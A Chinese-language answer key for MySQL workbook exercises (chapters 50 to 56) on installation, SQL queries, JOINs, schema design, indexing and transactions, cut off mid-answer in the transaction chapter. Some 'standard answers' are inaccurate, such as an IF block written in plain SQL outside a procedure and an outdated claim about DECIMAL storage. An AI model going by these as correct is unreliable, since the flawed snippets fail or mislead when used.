# 附录P：练习参考答案（下）—— 第50~115章

> **对应**：附录K-配套练习册（下）.md
>
> **使用建议**：先独立完成练习，再对照答案。每道题答案包含「标准答案」「解析」「改值实验 / 换个角度想」三部分。

---

## 第50章 · 数据库基础

### K-50-1 MySQL安装验证

**标准答案**：
```sql
SELECT VERSION();
-- 期望输出：8.0.x（如 8.0.36）
SHOW DATABASES;
-- 期望输出：
-- information_schema
-- mysql
-- performance_schema
-- sys
```

**解析**：
- `SELECT VERSION()` 返回 MySQL Server 版本号，验证安装成功且版本正确。
- `SHOW DATABASES` 列出所有数据库。四个系统库的作用：
  - `information_schema`：元数据信息（表结构、列信息等）
  - `mysql`：用户权限、时区等核心系统表
  - `performance_schema`：性能监控数据
  - `sys`：基于 performance_schema 的易用视图集合

**换个角度想**：如果不是这四个库而是三个或五个，说明安装版本不同（如 MariaDB 可能有额外库）。生产环境中，你应该用 `SELECT VERSION()` 而非数数据库个数来验证版本。

---

### K-50-2 创建第一个数据库和表

**标准答案**：
```sql
CREATE DATABASE practice_db
    CHARACTER SET utf8mb4
    COLLATE utf8mb4_unicode_ci;

USE practice_db;

CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO users (username) VALUES ('alice');

SELECT * FROM users;
-- 期望输出：
-- +----+----------+---------------------+
-- | id | username | created_at          |
-- +----+----------+---------------------+
-- |  1 | alice    | 2026-05-28 12:00:00 |
-- +----+----------+---------------------+
```

**解析**：
- `utf8mb4` 是真正的 UTF-8，支持 emoji（MySQL 的 `utf8` 别名实际是 `utf8mb3`，不支持 4 字节字符）。
- `utf8mb4_unicode_ci` 排序规则：`ci` = case-insensitive，大小写不敏感。
- `AUTO_INCREMENT` 自增主键，MySQL 保证每条新纪录 id 递增。
- `DEFAULT CURRENT_TIMESTAMP`：插入时不指定该字段则自动填当前时间。

**改值实验**：
- **把 `utf8mb4_unicode_ci` 改成 `utf8mb4_bin`**：插入 `'Alice'` 和 `'alice'`，前者视为不同值（bin=二进制比较，区分大小写），后者视为相同（ci=不区分）。
  为什么要注意？→ 用户名唯一约束如果用 `_ci`，`Alice` 和 `alice` 会冲突。如果你的业务需要区分大小写的用户名，必须用 `_bin` 或 `_cs` 排序规则。
  理解什么？→ `CHARACTER SET` 决定「能存什么字符」，`COLLATION` 决定「怎么比较和排序」。

- **把 `DEFAULT CURRENT_TIMESTAMP` 去掉**：INSERT 不指定 `created_at` 时会报错 `Field 'created_at' doesn't have a default value`（如果 sql_mode 严格）。生产环境中，前端展示「未知时间」很不专业，建议保留默认值。

---

### K-50-3 数据库配置排查 ⭐

**标准答案**：

**可能原因 1：MySQL 服务未启动**
```
现象：Windows 服务列表中 MySQL80 状态为"已停止"
解决：services.msc → 找到 MySQL80 → 启动；或 net start MySQL80
```

**可能原因 2：端口被占用或错误**
```
现象：MySQL 默认 3306 端口被其他程序占用
排查：netstat -ano | findstr 3306
解决：停止占用端口的程序；或在 my.ini 中修改 MySQL 端口为 3307
```

**可能原因 3：防火墙阻止**
```
现象：Windows 防火墙阻止了 3306 端口入站连接
解决：控制面板 → Windows Defender 防火墙 → 高级设置 → 入站规则 → 新建规则 → 允许 3306 端口
```

**可能原因 4：MySQL 绑定地址限制**
```
现象：my.ini 中 bind-address = 127.0.0.1 只允许本地连接，而你用 -h 192.168.x.x
解决：将 bind-address 改为 0.0.0.0 或注释掉该行（需重启服务）
```

**可能原因 5：安装不完整 / 初始化未完成**
```
现象：安装后未执行 mysqld --initialize
解决：删除 data 目录，重新执行 mysqld --initialize --console，记下临时密码
```

**换个角度想**：报错码 `10061` 是 Windows Socket 错误，含义是「目标机器积极拒绝」——也就是说，你的电脑向 `localhost:3306` 发出了 TCP SYN 包，但没有人应答。这说明问题一定在网络/进程层面（MySQL 没在监听 3306），而不是用户名密码层面。排错时记住这个分层思路：进程 → 端口 → 防火墙 → 配置。

---

## 第51章 · SQL 基础 DDL/DML

### K-51-1 学生表 DDL + DML

**标准答案**：
```sql
CREATE TABLE students (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(20) NOT NULL,
    age TINYINT DEFAULT 18,
    gender ENUM('M', 'F'),
    score DECIMAL(4,1),
    CONSTRAINT chk_score CHECK (score >= 0 AND score <= 100)
);

INSERT INTO students (name, age, gender, score) VALUES
('张三', 20, 'M', 85.5),
('李四', 22, 'F', 92.0),
('王五', 19, 'M', 76.0),
('赵六', 21, 'F', 88.5),
('小明', 20, 'M', 95.0);

SELECT * FROM students;
```

**解析**：
- `TINYINT`：1 字节，范围 -128~127，存储年龄足够。
- `ENUM('M','F')`：值限定为 M 或 F，插入其他值会报错（严格模式下）。
- `DECIMAL(4,1)`：总共 4 位数字，1 位小数。范围 -999.9 ~ 999.9，对于 0~100 的分数足够。
- `CHECK` 约束：MySQL 8.0.16+ 才真正执行 CHECK 约束，之前版本语法不报错但不生效。

**改值实验**：
- **把 `DECIMAL(4,1)` 改成 `FLOAT`**：插入 `95.0` 后查询可能得到 `94.999997...`（浮点数精度问题）。分数计算（平均分）会出现舍入误差。
  为什么要注意？→ 金额、分数等需要精确计算的字段，绝不能用 `FLOAT`/`DOUBLE`，必须用 `DECIMAL`。
  理解什么？→ `FLOAT` 是近似值，`DECIMAL` 是定点精确值。MySQL 内部 `DECIMAL` 以字符串形式存储。

- **把 `ENUM('M','F')` 改成 `VARCHAR(1)`**：可以插入 `'X'` 而不会报错。ENUM 提供了数据库层面的约束，VARCHAR 则需要在应用层校验。
  为什么要注意？→ 数据库约束是最可靠的最后一道防线，永远不要只依赖应用层校验。

---

### K-51-2 商品表 CRUD

**标准答案**：
```sql
CREATE TABLE products (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(100),
    price DECIMAL(10,2),
    stock INT DEFAULT 0
);

INSERT INTO products (name, price, stock) VALUES
('iPhone 15', 6999.00, 50),
('无线耳机', 299.00, 200),
('手机壳', 29.90, 0);

UPDATE products SET price = price * 1.10 WHERE id = 2;

DELETE FROM products WHERE stock = 0;

SELECT * FROM products WHERE price BETWEEN 50 AND 200;
```

**解析**：
- `price * 1.10`：直接在 SQL 中计算，避免读出再写回的冗余操作。
- `BETWEEN 50 AND 200`：等价于 `price >= 50 AND price <= 200`，闭区间。
- `DELETE FROM products WHERE stock = 0` 会删除所有库存为 0 的商品。生产环境建议先 `SELECT` 确认要删除的行。

**改值实验**：
- **把 `price * 1.10` 改成 `price + 10`**：前者是上调 10%（比例），后者是加 10 元（绝对值）。对 6999 元的 iPhone，前者涨 699.9 元，后者只涨 10 元。
  为什么要注意？→ 价格调整策略决定公式：按比例调价用乘法，固定金额调价用加法。选错公式会导致巨大偏差。
  理解什么？→ SQL 中的算术运算直接作用在字段上，一条 UPDATE 可以批量修改，比先 SELECT 再程序计算再 UPDATE 高效得多。

---

### K-51-3 批量数据生成 ⭐

**标准答案**：
```sql
DROP PROCEDURE IF EXISTS generate_students;

DELIMITER $$
CREATE PROCEDURE generate_students(IN total INT)
BEGIN
    DECLARE i INT DEFAULT 1;
    DECLARE rand_score DECIMAL(4,1);
    DECLARE rand_age TINYINT;
    DECLARE rand_gender CHAR(1);
    WHILE i <= total DO
        SET rand_score = 40 + RAND() * 60;
        SET rand_age = 18 + FLOOR(RAND() * 8);
        SET rand_gender = IF(RAND() > 0.5, 'M', 'F');
        INSERT INTO students (name, age, gender, score)
        VALUES (CONCAT('student_', LPAD(i, 3, '0')), rand_age, rand_gender, rand_score);
        SET i = i + 1;
    END WHILE;
END$$
DELIMITER ;

CALL generate_students(100);

SELECT COUNT(*) FROM students;
-- 期望：100
SELECT * FROM students LIMIT 5;
-- 期望：student_001 ~ student_005
```

**解析**：
- `DELIMITER $$`：因为存储过程体内有 `;`，需要临时改变分隔符防止 MySQL 客户端提前截断。
- `LPAD(i, 3, '0')`：左填充，`1` → `001`，保证 `student_001` ~ `student_100` 格式。
- `RAND()`：返回 0~1 随机浮点数，`40 + RAND() * 60` 得到 40~100。
- `FLOOR(RAND() * 8)`：0~7 的随机整数，加 18 得到 18~25 年龄。

**改值实验**：
- **把 `40 + RAND() * 60` 改成 `RAND() * 100`**：score 范围从 40~100 变成 0~100，会出现大量不及格数据。及格率从可能 70%+ 骤降到约 60%。
  为什么要注意？→ 测试数据的分布决定了测试的有效性。如果你要测试及格率查询，数据必须覆盖及格线附近的值（如 59.5 和 60.0）。
  理解什么？→ 生成测试数据时，分布比数量更重要。均匀分布和正态分布会产生完全不同的查询结果。

---

## 第52章 · SQL 查询

### K-52-1 组合查询

**标准答案**：
```sql
-- 1. score >= 60 且 gender = 'F'，按 score 降序，取前 3
SELECT * FROM students
WHERE score >= 60 AND gender = 'F'
ORDER BY score DESC
LIMIT 3;

-- 2. age 在 20~25，按 age 升序、score 降序
SELECT * FROM students
WHERE age BETWEEN 20 AND 25
ORDER BY age ASC, score DESC;

-- 3. name 中包含 "张"
SELECT * FROM students
WHERE name LIKE '%张%';
```

**解析**：
- `ORDER BY score DESC LIMIT 3`：先排序再截断。MySQL 执行顺序：FROM → WHERE → SELECT → ORDER BY → LIMIT。
- `ORDER BY age ASC, score DESC`：多列排序，先按 age 升序，age 相同时按 score 降序。
- `LIKE '%张%'`：`%` 匹配任意字符序列。如果表有索引且查询 `LIKE '张%'` 可以用到索引，但 `LIKE '%张%'` 无法使用索引（前缀通配）。

**改值实验**：
- **把 `LIMIT 3` 改成 `LIMIT 100`**：结果多了很多，但如果表中符合条件的女生只有 5 条，那实际上 3 和 100 的区别不大。
  为什么要注意？→ LIMIT 不改变查询的扫描量，MySQL 仍然扫描了所有满足 WHERE 的行，只是返回时截断。如果表有 100 万行，不加索引的话，即使 `LIMIT 1` 也要全表扫描。
  理解什么？→ LIMIT 不能替代 WHERE 条件过滤，它只在最后截断结果。

---

### K-52-2 模糊搜索与分页

**标准答案**：
```sql
-- 1. 搜索"手机"，按价格降序，第 2 页（每页 5 条）
SELECT * FROM products
WHERE name LIKE '%手机%'
ORDER BY price DESC
LIMIT 5 OFFSET 5;

-- 2. 统计价格区间商品数量
SELECT
    CASE
        WHEN price BETWEEN 0 AND 99 THEN '0~99'
        WHEN price BETWEEN 100 AND 499 THEN '100~499'
        WHEN price BETWEEN 500 AND 999 THEN '500~999'
        WHEN price >= 1000 THEN '1000+'
    END AS price_range,
    COUNT(*) AS cnt
FROM products
GROUP BY price_range
ORDER BY MIN(price);
```

**解析**：
- `LIMIT 5 OFFSET 5`：跳过前 5 条，取第 6~10 条。等价于 `LIMIT 5,5`。第 N 页 = `LIMIT pageSize OFFSET (page-1)*pageSize`。
- `CASE WHEN ... END`：在 SELECT 中做条件判断，配合 GROUP BY 实现分段统计。
- 分页的陷阱：OFFSET 很大时（如第 10000 页），MySQL 仍需扫描并丢弃前面所有行，性能极差。生产环境建议用游标分页。

**改值实验**：
- **把 `LIMIT 5 OFFSET 5` 改成 `LIMIT 5 OFFSET 500000`**：即使只需要 5 条数据，MySQL 会扫描并丢弃前 50 万行，查询可能需要数秒。
  为什么要注意？→ 深分页是 MySQL 的经典性能杀手。解决方案：使用 `WHERE id > last_id` 的游标分页，或使用 Elasticsearch 等搜索引擎。
  理解什么？→ OFFSET 不是免费的——它是「扫描后丢弃」，不是「跳过不扫描」。

---

### K-52-3 复杂报表查询 ⭐

**标准答案**：
```sql
-- 1. 各性别统计
SELECT
    gender,
    ROUND(AVG(score), 1) AS avg_score,
    MAX(score) AS max_score,
    MIN(score) AS min_score,
    ROUND(SUM(CASE WHEN score >= 60 THEN 1 ELSE 0 END) / COUNT(*), 2) AS pass_rate
FROM students
GROUP BY gender;

-- 2. 各年龄段平均分
SELECT
    CASE
        WHEN age BETWEEN 18 AND 20 THEN '18~20'
        WHEN age BETWEEN 21 AND 23 THEN '21~23'
        ELSE '24+'
    END AS age_group,
    ROUND(AVG(score), 1) AS avg_score
FROM students
GROUP BY age_group
ORDER BY MIN(age);

-- 3. 比同龄平均分高 20 分以上的学生
SELECT s.*, s.score - avg_tbl.avg_score AS diff
FROM students s
JOIN (
    SELECT age, AVG(score) AS avg_score
    FROM students
    GROUP BY age
) avg_tbl ON s.age = avg_tbl.age
WHERE s.score - avg_tbl.avg_score > 20;
```

**解析**：
- 及格率：`SUM(CASE WHEN score >= 60 THEN 1 ELSE 0 END) / COUNT(*)` 是标准写法。MySQL 中可简化为 `AVG(score >= 60)`（布尔值当作 0/1）。
- 子查询 `avg_tbl`：先计算每个年龄的平均分，再 JOIN 回原表比较。这比在 WHERE 中嵌套子查询效率高，因为子查询只执行一次。
- 如果没有任何学生满足 `score - avg_score > 20`，结果为空集（不是错误）。

**改值实验**：
- **把 `> 20` 改成 `> 5`**：结果可能从 0 行变成 10+ 行。阈值越小，符合条件的"优秀学生"越多。
  为什么要注意？→ 阈值的设定直接决定分析结论。如果你要对"尖子生"发奖学金，阈值应该基于业务需求（如前 5%）而非拍脑袋定 20 分。
  理解什么？→ 在报表中，「20 分」是一个 magic number，应该来自业务规则文档而非随意设定。

---

## 第53章 · JOIN

### K-53-1 用户+订单关联查询

**标准答案**：
```sql
INSERT INTO users (name, city) VALUES
('Alice', 'Beijing'),
('Bob', 'Shanghai'),
('Carol', 'Beijing'),
('Dave', 'Shenzhen'),
('Eve', 'Shanghai');

INSERT INTO orders (user_id, amount) VALUES
(1, 150.00), (1, 200.00),
(2, 99.00),
(3, 350.00), (3, 120.00), (3, 80.00),
(5, 500.00), (5, 50.00), (5, 30.00), (5, 100.00);
-- Dave(user_id=4) 无订单

-- 2. INNER JOIN 总消费金额
SELECT u.name, SUM(o.amount) AS total_amount
FROM users u
INNER JOIN orders o ON u.id = o.user_id
GROUP BY u.id, u.name;

-- 3. LEFT JOIN 所有用户及订单数
SELECT u.name, COUNT(o.id) AS order_count
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
GROUP BY u.id, u.name;

-- 4. 从未下过订单的用户
SELECT u.name
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
WHERE o.id IS NULL;
```

**解析**：
- INNER JOIN 结果不会包含 Dave（id=4），因为他没有匹配的 orders 行。
- LEFT JOIN 保留左表所有行，无匹配时右表字段为 NULL。`COUNT(o.id)` 对 NULL 不计数，所以 Dave 的 order_count=0。若写成 `COUNT(*)` 则 Dave 也是 1。
- `WHERE o.id IS NULL` 是找无订单用户的标准写法。注意不能用 `WHERE o.id = NULL`（NULL 不能用 `=` 比较）。

**改值实验**：
- **把 `COUNT(o.id)` 改成 `COUNT(*)` 后再 LEFT JOIN**：Dave 的 order_count 从 0 变成 1。
  为什么要注意？→ `COUNT(*)` 计数行，包括 NULL 行。在 LEFT JOIN 场景下，无匹配行也占一行（右表全是 NULL），所以每人至少 1。这是一个非常容易犯的错误。
  理解什么？→ LEFT JOIN 中统计子表记录数，必须 `COUNT(子表.主键)` 而非 `COUNT(*)`。

---

### K-53-2 LEFT JOIN vs INNER JOIN 区别

**标准答案**：
```sql
-- 假设 users: (1,'Alice'), (2,'Bob')
-- 假设 orders: (1,1,100) — 只有 Alice 有订单

-- LEFT JOIN
SELECT u.name, o.amount
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;
-- 结果：
-- Alice | 100.00
-- Bob   | NULL

-- INNER JOIN
SELECT u.name, o.amount
FROM users u
INNER JOIN orders o ON u.id = o.user_id;
-- 结果：
-- Alice | 100.00
-- Bob 不会出现！
```

**结论**：LEFT JOIN 保留左表所有行（Bob 的 NULL 行也出现），INNER JOIN 只保留两表都有匹配的行。在统计报表中，「所有用户 + 订单数」必须用 LEFT JOIN，否则会漏掉无订单用户。

**换个角度想**：想象两个集合的维恩图。INNER JOIN = 交集；LEFT JOIN = 左集合的全部 + 交集部分的右集合信息。当你需要"所有 XX，以及它可能有的 YY"时，一定是 LEFT JOIN。

---

### K-53-3 多表关联报表 ⭐

**标准答案**：
```sql
INSERT INTO order_items (order_id, product_name, quantity, unit_price) VALUES
(1, '钢笔', 2, 75.00),
(1, '笔记本', 3, 50.00),
(2, '铅笔', 10, 9.90),
(3, '钢笔', 1, 75.00),
(3, '橡皮', 5, 5.00),
(3, '笔记本', 2, 50.00),
(4, '钢笔', 1, 75.00);

-- 2. 每个用户消费最高的订单详情
WITH order_totals AS (
    SELECT o.id AS order_id, o.user_id, SUM(oi.quantity * oi.unit_price) AS total
    FROM orders o
    JOIN order_items oi ON o.id = oi.order_id
    GROUP BY o.id, o.user_id
),
ranked AS (
    SELECT u.name, ot.order_id, ot.total,
           ROW_NUMBER() OVER (PARTITION BY ot.user_id ORDER BY ot.total DESC) AS rn
    FROM order_totals ot
    JOIN users u ON u.id = ot.user_id
)
SELECT name, order_id, total
FROM ranked
WHERE rn = 1;

-- 3. 购买过同一商品 2 次以上的用户
SELECT u.name, oi.product_name, COUNT(DISTINCT o.id) AS purchase_count
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
GROUP BY u.id, u.name, oi.product_name
HAVING COUNT(DISTINCT o.id) >= 2;
```

**解析**：
- CTE（`WITH ... AS`）使复杂查询分层可读。`order_totals` 计算每个订单总金额，`ranked` 按用户分组排名。
- `ROW_NUMBER() OVER (PARTITION BY user_id ORDER BY total DESC)`：窗口函数，每个用户内部按金额降序编号。rn=1 即最高消费订单。
- Q3 用 `COUNT(DISTINCT o.id)` 而非 `COUNT(*)`，因为同一订单同一商品可能有多条明细，我们要的是"在几个不同订单中买过"。

**改值实验**：
- **把 `ROW_NUMBER()` 改成 `RANK()`**：多个订单金额相同时，RANK 会产生并列第一（都标记为 1），结果可能返回同一用户的多条记录。
  为什么要注意？→ `ROW_NUMBER`、`RANK`、`DENSE_RANK` 三种排名函数处理并列值的策略不同，选错会导致结果数量差异。
  理解什么？→ ROW_NUMBER = 即使相同也递增编号；RANK = 相同编号、跳过后续；DENSE_RANK = 相同编号、不跳过。

---

## 第54章 · 表设计

### K-54-1 电商系统表结构设计

**标准答案**：
```sql
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL,
    email VARCHAR(100) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
    -- INDEX idx_email (email)  -- UNIQUE 约束自带索引
);

CREATE TABLE products (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(200) NOT NULL,
    description TEXT,
    price DECIMAL(10,2) NOT NULL,
    stock INT NOT NULL DEFAULT 0,
    status TINYINT DEFAULT 1 COMMENT '1=上架 0=下架',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_status_price (status, price),
    INDEX idx_name (name(50))
);

CREATE TABLE orders (
    id INT PRIMARY KEY AUTO_INCREMENT,
    user_id INT NOT NULL,
    total_amount DECIMAL(12,2) NOT NULL DEFAULT 0,
    status TINYINT DEFAULT 0 COMMENT '0=待支付 1=已支付 2=已发货 3=已完成 4=已取消',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id),
    INDEX idx_user_created (user_id, created_at),
    INDEX idx_status (status)
);

CREATE TABLE order_items (
    id INT PRIMARY KEY AUTO_INCREMENT,
    order_id INT NOT NULL,
    product_id INT NOT NULL,
    quantity INT NOT NULL,
    unit_price DECIMAL(10,2) NOT NULL COMMENT '下单时的单价快照',
    FOREIGN KEY (order_id) REFERENCES orders(id),
    FOREIGN KEY (product_id) REFERENCES products(id),
    INDEX idx_order (order_id)
);
```

**解析**：
- `unit_price` 快照：订单明细中的价格是下单时的价格，不要 JOIN `products.price`，因为商品价格会变。
- `INDEX idx_status_price (status, price)`：覆盖「上架商品按价格排序」查询。最左前缀原则：此索引也可单独用于 `WHERE status=?`。
- `INDEX idx_user_created (user_id, created_at)`：覆盖「我的订单按时间排序」查询。
- `ON UPDATE CURRENT_TIMESTAMP`：行更新时自动刷新时间戳。

**换个角度想**：如果需求方说「订单要能看到商品快照信息（名称、图片）」，你会把 `product_name`、`product_image` 冗余存到 `order_items` 吗？这在电商中非常常见——商品信息会变，但历史订单必须保持原样。这就是「快照冗余」，是反范式设计的合理应用。

---

### K-54-2 范式判断

**标准答案**：

原表 `employee_orders` 违反 3NF，存在以下问题：

**传递依赖**：
- `employee_id → employee_name`（非主属性依赖非主属性）——其实是依赖 employee_id
- `employee_id → department → dept_location`（部门地点传递依赖于员工）

**部分依赖**（假设主键是 `(order_id, product)`）：
- `employee_id → employee_name, department, dept_location` — 部分依赖，employee 信息只依赖于 order 的一部分

**拆分后（3NF）**：

```sql
CREATE TABLE employees (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(50) NOT NULL,
    department_id INT NOT NULL,
    FOREIGN KEY (department_id) REFERENCES departments(id)
);

CREATE TABLE departments (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(50) NOT NULL,
    location VARCHAR(100)
);

CREATE TABLE orders (
    id INT PRIMARY KEY AUTO_INCREMENT,
    employee_id INT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (employee_id) REFERENCES employees(id)
);

CREATE TABLE order_items (
    id INT PRIMARY KEY AUTO_INCREMENT,
    order_id INT NOT NULL,
    product_name VARCHAR(100) NOT NULL,
    quantity INT NOT NULL,
    price DECIMAL(10,2) NOT NULL,
    FOREIGN KEY (order_id) REFERENCES orders(id)
);
```

**换个角度想**：违反范式的惩罚是什么？如果你不拆表，当某个部门搬了办公室，你需要 UPDATE 这个部门所有员工的订单记录——假设 10 万条。而在 3NF 中，你只需要 UPDATE `departments` 表的一行。这就是「更新异常」。

---

### K-54-3 反范式设计场景 ⭐

**标准答案**：

**新表 DDL**：
```sql
CREATE TABLE hot_products (
    product_id INT PRIMARY KEY,
    product_name VARCHAR(200) NOT NULL,
    current_price DECIMAL(10,2) NOT NULL,
    sales_count INT NOT NULL DEFAULT 0,
    rank_order INT DEFAULT 0,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (product_id) REFERENCES products(id)
);
```

**数据同步策略**：
```
方案：定时任务 + 增量更新
1. 每分钟执行一次汇总任务：
   - 统计过去 7 天的订单明细，按 product_id 汇总销量
   - 将结果 INSERT ... ON DUPLICATE KEY UPDATE 写入 hot_products
   - 同时更新 current_price（从 products 表同步）
2. 首页直接查 hot_products：
   SELECT * FROM hot_products ORDER BY sales_count DESC LIMIT 10;
```

**伪代码**：
```sql
INSERT INTO hot_products (product_id, product_name, current_price, sales_count)
SELECT
    oi.product_id,
    p.name,
    p.price,
    SUM(oi.quantity) AS total_sales
FROM order_items oi
JOIN products p ON p.id = oi.product_id
JOIN orders o ON o.id = oi.order_id
WHERE o.created_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)
  AND o.status IN (1,2,3)  -- 已支付及以上
GROUP BY oi.product_id, p.name, p.price
ON DUPLICATE KEY UPDATE
    product_name = VALUES(product_name),
    current_price = VALUES(current_price),
    sales_count = VALUES(sales_count),
    updated_at = NOW();
```

**解析**：
- 原方案每次请求 JOIN 三张表，100 万订单 × 10 万商品，即使有索引也很慢。
- 反范式方案将热销排行预计算到一张宽表，首页查 10 行，毫秒级返回。
- 1 分钟的延迟对热销排行来说是可接受的（用户感知不到 60 秒的延迟）。

**换个角度想**：反范式不是「乱设计」，而是**用空间换时间，用延迟换性能**。关键决策是：你能接受多大的延迟？1 分钟？1 小时？这决定了同步频率。如果你的场景是「实时竞价排名」，连 1 分钟都嫌长，那可能需要 Redis SortedSet 而不是 MySQL 汇总表。

---

## 第55章 · 索引

### K-55-1 EXPLAIN 分析练习

**标准答案**：

```sql
-- 1. 无索引
EXPLAIN SELECT * FROM orders WHERE user_id = 5 AND created_at > '2024-01-01';
-- type: ALL, rows: ~10000, Extra: Using where
-- 全表扫描，扫描所有行后用 WHERE 过滤

-- 2. 单列索引
CREATE INDEX idx_user_id ON orders(user_id);
EXPLAIN SELECT * FROM orders WHERE user_id = 5 AND created_at > '2024-01-01';
-- type: ref, rows: ~该用户的订单数, Extra: Using where
-- 使用 user_id 索引快速定位，但 created_at 仍需逐行判断

CREATE INDEX idx_created_at ON orders(created_at);
-- type: range, rows: 时间范围内的行, Extra: Using where
-- 使用 created_at 索引，user_id 逐行判断

-- 3. 联合索引
CREATE INDEX idx_user_created ON orders(user_id, created_at);
EXPLAIN SELECT * FROM orders WHERE user_id = 5 AND created_at > '2024-01-01';
-- type: range, rows: 最少, Extra: Using index condition
-- 联合索引中两个条件都能用上
```

**最优选择**：联合索引 `idx_user_created (user_id, created_at)`。
- 理由：等值条件在前（user_id=5），范围条件在后（created_at>...），符合最左前缀原则。
- 两个单列索引各有短板：idx_user_id 只能过滤 user_id，created_at 判断要回表；idx_created_at 需要扫描大量不相关用户的数据。

**改值实验**：
- **把 `idx_user_created (user_id, created_at)` 改成 `(created_at, user_id)`**：范围条件 `created_at >` 在前，user_id 等值条件在后。由于范围条件之后的索引列无法使用，这个索引等价于只在 created_at 上建索引。
  为什么要注意？→ 联合索引的列顺序至关重要。等值条件放前面，范围条件放后面。
  理解什么？→ 最左前缀原则：联合索引 (A,B,C) 可以用于 (A)、(A,B)、(A,B,C) 的查询，但不能用于 (B,C) 或 (C)。

---

### K-55-2 设计最优索引组合

**标准答案**：

```sql
-- 查询 1：WHERE user_id = ? AND created_at BETWEEN ? AND ?
-- 索引：idx_user_created (user_id, created_at)
-- 理由：等值在前，范围在后

-- 查询 2：WHERE action = ? AND target_type = ?
-- 索引：idx_action_target (action, target_type)
-- 理由：两个都是等值条件，顺序按区分度高的在前

-- 查询 3：WHERE user_id = ? AND action = ? ORDER BY created_at DESC
-- 索引：idx_user_action_created (user_id, action, created_at)
-- 理由：等值条件加排序字段，消除 filesort

-- 查询 4：WHERE target_type = ? AND target_id = ?
-- 索引：idx_target_type_id (target_type, target_id)
-- 理由：两个等值条件，联合即可

-- 合并建议：
-- idx_user_created 和 idx_user_action_created 的前两列相同，
-- 如果 idx_user_action_created 的区分度就够，可以只用这一个覆盖查询 1 和 3
-- 最终推荐索引：
CREATE INDEX idx_user_action_created ON logs(user_id, action, created_at);
CREATE INDEX idx_action_target ON logs(action, target_type);
CREATE INDEX idx_target_type_id ON logs(target_type, target_id);
```

**解析**：
- 查询 3 有 `ORDER BY created_at`，如果索引包含 created_at 且在前面的条件都是等值，MySQL 可以避免 filesort。
- 合并索引的判断依据：查询频率和索引维护成本。索引不是越多越好——每多一个索引，INSERT/UPDATE 就要多维护一个 B+Tree。

**换个角度想**：如果查询 2 的 `action` 只有 5 种值（登录、查询、修改、删除、导出），而 `target_type` 有 50 种，哪个放前面？区分度低的放前面，区分度高的放后面即可——实际上两个等值条件，谁前谁后 B+Tree 都能高效定位。真正重要的是：如果有个查询只查 `target_type` 不查 `action`，那 `(action, target_type)` 就用不上，需要 `(target_type)` 的额外索引。

---

### K-55-3 索引失效场景 ⭐

**标准答案**：

```sql
-- 场景 1：函数包裹索引列
-- ❌ 失效
SELECT * FROM logs WHERE YEAR(created_at) = 2024;
-- ✅ 修正
SELECT * FROM logs WHERE created_at >= '2024-01-01' AND created_at < '2025-01-01';

-- 场景 2：隐式类型转换
-- ❌ 失效（假设 user_id 是 VARCHAR）
SELECT * FROM logs WHERE user_id = 12345;
-- ✅ 修正
SELECT * FROM logs WHERE user_id = '12345';

-- 场景 3：LIKE 前缀通配
-- ❌ 失效
SELECT * FROM logs WHERE action LIKE '%login%';
-- ✅ 修正（如果可以接受左锚定）
SELECT * FROM logs WHERE action LIKE 'login%';
-- 或使用 FULLTEXT 索引

-- 场景 4：OR 条件中部分列无索引
-- ❌ 失效（假设 target_type 有索引，target_id 没有）
SELECT * FROM logs WHERE target_type = 'article' OR target_id = 5;
-- ✅ 修正：拆为 UNION
SELECT * FROM logs WHERE target_type = 'article'
UNION
SELECT * FROM logs WHERE target_id = 5;

-- 场景 5：NOT / != / <> 操作
-- ❌ 失效
SELECT * FROM logs WHERE action != 'login';
-- ✅ 修正（如果可以）
SELECT * FROM logs WHERE action IN ('query', 'update', 'delete');
```

**解析**：
- 场景 1：函数包裹后，MySQL 无法确定索引中的值经过函数后的结果，只能全表扫描。
- 场景 2：MySQL 自动做类型转换时，相当于对列应用了函数，索引失效。VARCHAR 列用整数查 → 索引失效；INT 列用字符串查 → 索引可能有效（MySQL 会把字符串转为数字）。

**改值实验**：
- **把 `LIKE '%login%'` 改成 `LIKE '%login'`**：两者都是前缀通配，索引都失效。只有 `LIKE 'login%'` 这种后缀通配才能用到索引。
  为什么要注意？→ 很多开发者以为只有 `LIKE '%xx'` 失效而 `LIKE 'xx%'` 有效——实际上只要通配符在开头就失效。
  理解什么？→ B+Tree 索引按字典序存储，它能快速定位以 'login' 开头的所有值（因为它们在 B+Tree 中是连续的），但无法定位「包含 login」的值（因为分布在树的各个角落）。

---

## 第56章 · 事务

### K-56-1 转账事务实现

**标准答案**：
```sql
START TRANSACTION;

-- 检查 A 余额
SELECT balance INTO @bal FROM accounts WHERE id = 1 FOR UPDATE;
-- 或：SELECT balance FROM accounts WHERE id = 1 FOR UPDATE;

IF @bal < 200 THEN
    ROLLBACK;
    SELECT '余额不足' AS result;
ELSE
    UPDATE accounts SET balance = balance - 200 WHERE id = 1;
    UPDATE accounts SET balance = balance + 200 WHERE id = 2;
    COMMIT;
